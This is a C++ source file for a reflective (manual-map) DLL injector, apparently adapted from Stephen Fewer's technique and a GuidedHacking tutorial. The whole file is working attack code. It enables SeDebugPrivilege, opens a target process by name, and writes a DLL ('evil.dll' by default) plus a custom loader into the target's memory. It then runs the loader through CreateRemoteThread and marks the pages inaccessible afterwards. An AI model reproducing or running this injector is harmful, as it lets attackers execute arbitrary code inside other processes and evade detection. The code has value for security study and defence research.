// Inspired by Stephen Fewer of Harmony Security && https://guidedhacking.com/threads/manual-mapping-dll-injection-tutorial-how-to-manual-map.10009/ 

#include "reflectiveDLL.h"

// Function that converts string to WString 
std::wstring stringToWString(const std::string& s)
{
	std::wstring temp(s.length(), L' ');
	std::copy(s.begin(), s.end(), temp.begin());
	return temp;
}


//Function that searches the pid of the process 
DWORD processID(const std::string name)
{
	std::vector<DWORD> pids;

	fprintf(stderr, " **** Searching PID for the processus : %s ****\n", name);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //snapshot of all processus

	PROCESSENTRY32 currentProcess;
	currentProcess.dwSize = sizeof currentProcess;

	if (!Process32FirstW(snapshot, &currentProcess))
		EXIT_WITH_ERROR("Process32FirstW fail !");

	do {
		if (std::wstring(currentProcess.szExeFile) == stringToWString(name)) {
			pids.emplace_back(currentProcess.th32ProcessID);
			fprintf(stderr, " **** Process find ! pid : %d  , ppid : %d ****\n", currentProcess.th32ProcessID, currentProcess.th32ParentProcessID);
		}
	} while (Process32NextW(snapshot, &currentProcess));

	if (pids.empty())
		EXIT_WITH_ERROR("Process not found !");

	return pids[0];

}

//Function that remplaces the API LoadLibraryA
DWORD __stdcall manualLoader(LPVOID Memory)
{

	loaderData* lParams = (loaderData*)Memory;

	PIMAGE_BASE_RELOCATION pIBR = lParams->baseReloc;

	// Difference between the image base defined in the PE Header and the actual allocation Base.
	DWORD64 delta = (DWORD64)((LPBYTE)lParams->imageBase - lParams->ntHeaders->OptionalHeader.ImageBase);

	while (pIBR->VirtualAddress)
	{
		if (pIBR->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION))
		{
			int count = (pIBR->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(DWORD);
			PWORD list = (PWORD)(pIBR + 1);

			for (int i = 0; i < count; i++)
			{
				if (list[i])
				{
					PDWORD ptr = (PDWORD)((LPBYTE)lParams->imageBase + (pIBR->VirtualAddress + (list[i] & 0xFFF))); //& 0xFFF : grab the low 12 bits that contain the RVA.
					*ptr += delta;
				}
			}
		}

		pIBR = (PIMAGE_BASE_RELOCATION)((LPBYTE)pIBR + pIBR->SizeOfBlock);
	}

	PIMAGE_IMPORT_DESCRIPTOR pIID = lParams->importDirectory;

	/* STEP 5 : Fix DLL imports */

	while (pIID->Characteristics)
	{
		PIMAGE_THUNK_DATA OrigFirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)lParams->imageBase + pIID->OriginalFirstThunk);
		PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)((LPBYTE)lParams->imageBase + pIID->FirstThunk);

		HMODULE hModule = lParams->f_LoadLibraryA((LPCSTR)lParams->imageBase + pIID->Name);

		if (!hModule)
			return FALSE;

		while (OrigFirstThunk->u1.AddressOfData)
		{
			if (OrigFirstThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
			{
				// Import by ordinal
				DWORD64 Function = (DWORD64)lParams->f_GetProcAddress(hModule,
					(LPCSTR)(OrigFirstThunk->u1.Ordinal & 0xFFFF));

				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			else
			{
				// Import by name
				PIMAGE_IMPORT_BY_NAME pIBN = (PIMAGE_IMPORT_BY_NAME)((LPBYTE)lParams->imageBase + OrigFirstThunk->u1.AddressOfData);
				DWORD64 Function = (DWORD64)lParams->f_GetProcAddress(hModule, (LPCSTR)pIBN->Name);
				if (!Function)
					return FALSE;

				FirstThunk->u1.Function = Function;
			}
			OrigFirstThunk++;
			FirstThunk++;
		}
		pIID++;
	}

	/* STEP 7 : Call entrypoint / DLLMain */

	if (lParams->ntHeaders->OptionalHeader.AddressOfEntryPoint)
	{
		dllmain EntryPoint = (dllmain)((LPBYTE)lParams->imageBase + lParams->ntHeaders->OptionalHeader.AddressOfEntryPoint);

		return EntryPoint((HMODULE)lParams->imageBase, DLL_PROCESS_ATTACH, NULL); 
	}
	return TRUE;
}


DWORD __stdcall stub()
{
	return 0;
}



int main(int argc, char* argv[])
{
	const char* dll = "C:\\Temp\\evil.dll";
	DWORD pid = NULL, dllSize = NULL;
	struct stat buffer;
	loaderData LParams;
	PVOID dllBuffer = nullptr, execImage = nullptr, loaderMem = nullptr;
	PIMAGE_DOS_HEADER pDosHeader = nullptr;
	PIMAGE_NT_HEADERS pNtHeaders = nullptr;
	PIMAGE_SECTION_HEADER pSectHeader = nullptr;
	HANDLE hDll		= NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;
	HANDLE hToken	= NULL;
	LUID luid = { 0 };


	fprintf(stderr, "**** Hello in Reflective Dll Injection  ! **** \n");

	//USAGE :  reflectiveDll.exe <target.exe>  or reflectiveDll.exe <target.exe> <dllPath>

	if (argc == 1 || argc >= 4) {

		EXIT_WITH_ERROR("You are missing an input | Usage : reflectiveDll.exe <target.exe> or reflectiveDll.exe <target.exe> <dllPath> ");

	}
	else if (argc == 3) {
		fprintf(stderr, "Use  dllPath : %s \n", argv[2]);

		if (stat(argv[2], &buffer) != 0) {
			fprintf(stderr, "%s not found ! \n", argv[2]);
			exit(-1);
		}

		dll = argv[2];

	}
	else {

		fprintf(stderr, "Use default dllPath : C:\\Temp\\evil.dll \n");

		if (stat(dll, &buffer) != 0) {
			fprintf(stderr, "%s not found ! \n", dll);
			exit(-1);
		}

	}

	// Get Token SE_DEBUG_PRIVILEGE
	//Requires administrator rights ! 

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
			TOKEN_PRIVILEGES token = { 0 };
			token.PrivilegeCount = 1;
			token.Privileges[0].Luid = luid;
			token.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			AdjustTokenPrivileges(hToken, FALSE, &token, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
		}
		else {
			EXIT_WITH_ERROR("Error LookupPrivilege ! ");
			CloseHandle(hToken);
		}
	}
	else {
		fprintf(stderr,"[-] Didn't get SE_DEBUG_PRIVILEGE token ! ");
	}

	CloseHandle(hToken);



	/* STEP 0 : Search pid of target process */

	pid = processID(argv[1]);

	fprintf(stderr, " **** Injecting DLL to first PID : %i  *****\n", pid);

	/* STEP 1 : Open and read the DLL to a buffer */

	fprintf(stderr, "*** Step 1 : Open and read the Dll to a buffer *** \n");

	hDll = CreateFileA((LPCSTR)dll, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, 0, NULL); 

	if (!hDll)
		EXIT_WITH_ERROR("/!/ Can't handle dll !");


	dllSize = GetFileSize(hDll, NULL);
	dllBuffer = VirtualAlloc(NULL, dllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!ReadFile(hDll, dllBuffer, dllSize, NULL, NULL))
		EXIT_WITH_ERROR("/!/ Can't read DLL");

	// Dll's Headers
	pDosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
	pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)dllBuffer + pDosHeader->e_lfanew);

	/* STEP 2 : Open process and map sections into target process */

	fprintf(stderr, "*** Step 2 : Open process and map section into target *** \n");

	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (!hProcess)
		EXIT_WITH_ERROR("/!/ Can't open process : try Run As Admin");

	fprintf(stderr, "*** Open process : %p *** \n", hProcess);
	fprintf(stderr, "*** Allocation of execImage *** \n");

	// Allocating memory for the DLL
	execImage = VirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	fprintf(stderr, "*** Address of execImage: %p *** \n", execImage);

	DWORD oldPerms1, oldPerms2; 

	/* STEP 3 : Inject sections and header of the DLL && inject loader payload */

	fprintf(stderr, "*** Step 3 : Write payload in execImage *** \n");

	// Copy the headers to target process
	WriteProcessMemory(hProcess, execImage, dllBuffer, pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

	// Target Dll's Section Header
	pSectHeader = (PIMAGE_SECTION_HEADER)(pNtHeaders + 1);

	// Copying sections of the dll to the target process
	for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++)
	{
		WriteProcessMemory(hProcess, (PVOID)((LPBYTE)execImage + pSectHeader[i].VirtualAddress), (PVOID)((LPBYTE)dllBuffer + pSectHeader[i].PointerToRawData), pSectHeader[i].SizeOfRawData, NULL);
	}

	fprintf(stderr, "*** Allocation of loaderMem *** \n");

	// Allocating memory for the manual loader code.
	loaderMem = VirtualAllocEx(hProcess, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!loaderMem)
		EXIT_WITH_ERROR(" Couldn't allocate for the loader code !");

	fprintf(stderr, "*** Address of manual Loader : %p \n", loaderMem);

	LParams.imageBase = execImage;
	LParams.ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)execImage + pDosHeader->e_lfanew);

	LParams.baseReloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)execImage
						+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	LParams.importDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((LPBYTE)execImage
						+ pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	LParams.f_LoadLibraryA = LoadLibraryA;
	LParams.f_GetProcAddress = GetProcAddress;

	// Write the loader information to target process
	WriteProcessMemory(hProcess, loaderMem, &LParams, sizeof(loaderData), NULL);

	// Write the loader code to target process
	WriteProcessMemory(hProcess, (PVOID)((loaderData*)loaderMem + 1), manualLoader, (DWORD64)stub - (DWORD64)manualLoader, NULL);
	

	/* STEP 6 : Create a remote thread to execute the manual loader */
	fprintf(stderr, "*** Step 4 : Creation of a remote thread *** \n");
	
	fprintf(stderr, "*** Change permission of exeImage and loadermem : RW --> RWX *** \n");

	if (!VirtualProtectEx(hProcess, (LPVOID)loaderMem, 4096, PAGE_EXECUTE_READWRITE, &oldPerms1))
		fprintf(stderr, "/!/ Error in VirtualProtect #1 \n");

	if (!VirtualProtectEx(hProcess, (LPVOID)execImage, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READWRITE, &oldPerms2))
		fprintf(stderr, "/!/ Error in VirtualProtect #2 \n");

	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((loaderData*)loaderMem + 1), loaderMem, 0, NULL);

	if (!hThread)
		EXIT_WITH_ERROR("/!/ Can't create remote thread !")

	if(WaitForSingleObject(hThread, 500) == 0x00000102L)
		EXIT_WITH_ERROR("The thread did'nt run in time !");

	if (!VirtualProtectEx(hProcess, (LPVOID)loaderMem, 4096, PAGE_NOACCESS, &oldPerms1))
		fprintf(stderr, "Error in VirtualProtect #3 \n");

	if (!VirtualProtectEx(hProcess, (LPVOID)execImage, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_NOACCESS, &oldPerms2))
		fprintf(stderr, "Error in VirtualProtect #4 \n");
	

	fprintf(stderr, "*** Success ! Goodbye ! *** \n ");

	/*STEP 8 : Clean up ! */

	CloseHandle(hThread);
	VirtualFree(dllBuffer, 0, MEM_RELEASE);
	//VirtualFreeEx(hProcess, loaderMem, 0, MEM_RELEASE);
	CloseHandle(hProcess);
	CloseHandle(hDll);

	return 0;
}